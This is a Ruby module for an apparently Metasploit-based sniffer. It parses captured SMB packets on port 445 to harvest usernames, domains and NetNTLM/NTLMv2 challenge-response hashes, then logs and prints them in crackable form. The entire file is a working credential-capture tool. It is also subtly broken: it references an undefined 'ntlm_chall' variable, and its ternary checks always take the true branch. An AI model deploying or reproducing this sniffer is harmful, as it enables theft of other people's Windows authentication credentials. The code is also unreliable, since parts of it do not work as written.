require 'pp'
class PigNBLogin < PigParser

        def can_parse(packet)
                return false if not packet.is_eth?
                return false if not packet.is_ip?
		if (packet.is_tcp? &&
		    (packet.tcp_dst == 445  || packet.tcp_src == 445) &&  
		    packet.payload[0] == "\x00"  &&
		    packet.payload[4..7] == "\xffSMB" &&
		    (packet.payload[8] == "\x73" || packet.payload[8] == "\x72" ) &&
		    packet.payload[9,4] == "\x00\x00\x00\x00")
			return true
		end
        end


	def parse(pkt)
		return if not can_parse(pkt)
		smb = pkt.payload[4..-1]
		return if (smb[4] != "\x73" && smb[4] != "\x72")
		if not smb.index("NTLMSSP")
			if smb.index("\x11\x05")
				chal = smb[69,8].unpack("H*").first
				@server_chals = {} if @server_chals.nil?
				@server_chals["#{pkt.ip_src}-#{pkt.ip_dst}"] = chal
				return
			end
			return if not smb.index("\x0d\x75")
 			ses = smb[smb.index("\x0d\x75")..-1]
			(asclen,unilen) =  ses[15,4].unpack("SS")
			asc = ses[29,asclen].unpack("H*").first
			uni = ses[29 + asclen,unilen].unpack("H*").first
			rest = ses[29 + asclen + unilen + 1..-1]
			nn = rest.index("\x00\x00") + 1
			user = Rex::Text.to_ascii(rest[0..nn])	
			rest = rest[nn+ 2..-1]
			nn = rest.index("\x00\x00") + 1
			nonce = @server_chals["#{pkt.ip_dst}-#{pkt.ip_src}"]
			domain = Rex::Text.to_ascii(rest[0..nn])	
			if unilen < 32
                        	report_auth_info(
                                	:host  => pkt.ip_daddr,
                                	:port => pkt.tcp_dst,
                                	:sname => 'smb',
                                	:user => user,
                                	:pass => domain + ":" + asc + ":" + uni + ":" + nonce,
                                	:type => "smb_netv1_hash",
                                	:proof => "NAME=#{pkt.ip_saddr} DOMAIN=#{domain}",
                                	:source_type => "captured",
                                	:active => true
				)
				print_status("NETNTLM:#{user}::#{domain}:#{asc}:#{uni}:#{@server_chals["#{pkt.ip_dst}-#{pkt.ip_src}"]}")
			else
				#uni_chal = uni[24..-1]
				#uni = uni[0,24]
                        	report_auth_info(
                                	:host  => pkt.ip_daddr,
                                	:port => pkt.tcp_dst,
                                	:sname => 'smb',
                                	:user => user,
                                	:pass => domain + ":" + asc + ":" + uni + ":" + nonce,
                                	#:pass => domain + ":" + nonce + ":" + uni + ":" + uni_chal,
                                	:type => "smb_netv2_hash",
                                	:proof => "NAME=#{pkt.ip_saddr} DOMAIN=#{domain}",
                                	:source_type => "captured",
                                	:active => true
				)
				print_status("NETNTLMv2:#{user}::#{domain}:#{asc}:#{uni}:#{@server_chals["#{pkt.ip_dst}-#{pkt.ip_src}"]}")
				#print_status("NETNTLMv2:#{user}::#{domain}:#{@server_chals["#{pkt.ip_dst}-#{pkt.ip_src}"]}:#{uni}:#{uni_chal}:#{asc}")
			end

		else
			authinfo = smb[smb.index("NTLMSSP")..-1]
			authtype = authinfo[8,4].unpack('L').first
			return if authtype  != 2 && authtype != 3
			if authtype == 2
				@server_chals = {} if @server_chals.nil?
				@server_chals["#{pkt.ip_src}-#{pkt.ip_dst}"] = authinfo[24,8].unpack("H*").first
				return
			end
	
			begin 
	
				(lmlen,lmmlen,lmoff) =  authinfo[12,8].unpack("SSL")
				(ntlmlen,ntlmmlen,ntlmoff) =  authinfo[20,8].unpack("SSL")
				(domlen,dommlen,domoff) = authinfo[28,8].unpack("SSL")
				(unlen,unmlen,unoff) = authinfo[36,8].unpack("SSL")
				(hnlen,hnmlen,hnoff) = authinfo[44,8].unpack("SSL")
				seskey = authinfo[52,8]
				flags = authinfo[60,4].unpack("L").first
				
				user =  Rex::Text.to_ascii(authinfo[unoff,unlen])
				domain =  Rex::Text.to_ascii(authinfo[domoff,domlen])
				host =  Rex::Text.to_ascii(authinfo[hnoff,hnlen])
				lm = authinfo[lmoff,lmlen]
				nt = authinfo[ntlmoff,ntlmlen]
				srv_chal = @server_chals["#{pkt.ip_dst}-#{pkt.ip_src}"]
				
				lm_chal = lm[16,8].unpack("H*").first
				lm_hash =  lm[0,16].unpack("H*").first
				ntlm_chal =  nt[16,8].unpack("H*").first
				ntlm_hash =  nt[0,16].unpack("H*").first
                                report_auth_info(
                                	:host  => pkt.ip_daddr,
                                	:port => pkt.tcp_dst,
                                	:sname => 'smb',
                                	:user => user,
                                	:pass => domain + ":" +
                                		( lm_hash + lm_chal ? lm_hash + lm_chal : "00" * 24 ) + ":" +
                                		( ntlm_hash + ntlm_chall ? ntlm_hash + ntlm_chall :  "00" * 24 ) + ":" +
                                		srv_chal,
                                	:type => "smb_netv2_hash",
                                	:proof => "NAME=#{pkt.ip_saddr} DOMAIN=#{domain}",
                                	:source_type => "captured",
                                	:active => true
				)
				print_status("NETLMV2: #{user},,#{domain},#{srv_chal},#{lm_hash},#{lm_chal}")
				print_status("NETNTLMV2: #{user},,#{domain},#{srv_chal},#{ntlm_hash},#{ntlm_chal}")
			rescue
				return
			end
			
	
		end								
	end # end of parse
end

